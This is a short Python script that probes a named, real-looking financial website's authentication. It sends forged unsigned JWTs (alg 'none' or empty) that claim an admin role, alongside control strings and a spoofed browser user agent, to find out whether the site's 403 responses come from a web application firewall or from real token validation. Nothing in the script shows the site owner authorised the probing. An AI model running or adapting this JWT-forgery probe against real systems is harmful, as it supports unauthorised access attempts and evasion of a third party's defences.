#!/usr/bin/env python3
"""Control test: is the 403 on alg:none Bearer tokens an auth decision or a WAF/bot filter?
Method: vary ONLY the Authorization value; if unrelated strings (e.g. 'none') also 403,
the filter is content-based (WAF), not token validation."""
import requests, time, json, base64
B="https://www.infinitycapital.bh"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"

def b64u(x): return base64.urlsafe_b64encode(x.encode()).rstrip(b'=').decode()
def mk(h,p): return b64u(json.dumps(h,separators=(',',':')))+"."+b64u(json.dumps(p,separators=(',',':')))+"."

cases=[
 ("no-auth-baseline", None),
 ("none-plain", "none"),
 ("garbage", "abc.def.ghi"),
 ("none-alg-jwt", "Bearer "+mk({"alg":"none","typ":"JWT"},{"sub":"1","role":"admin"})),
 ("none-alg-jwt-lower", "Bearer "+mk({"alg":"none"},{"sub":"1"})),
 ("empty-alg", "Bearer "+mk({"alg":""},{"sub":"1"})),
 ("HS256-valid-looking", "Bearer "+mk({"alg":"HS256","typ":"JWT"},{"sub":"1","role":"admin"})+"sig"),
 ("random-64hex", "Bearer "+"A"*64),
]
for name,hv in cases:
    s=requests.Session(); s.headers.update({"User-Agent":UA})
    h={"Authorization":hv} if hv else {}
    r=s.get(B+"/",headers=h,timeout=30)
    marker=""
    if r.status_code!=200: marker=" <<< "+(r.text[:60] or "").replace("\n"," ")
    print(f"{name:22s} -> {r.status_code} len={len(r.content)}{marker}")
    time.sleep(4)
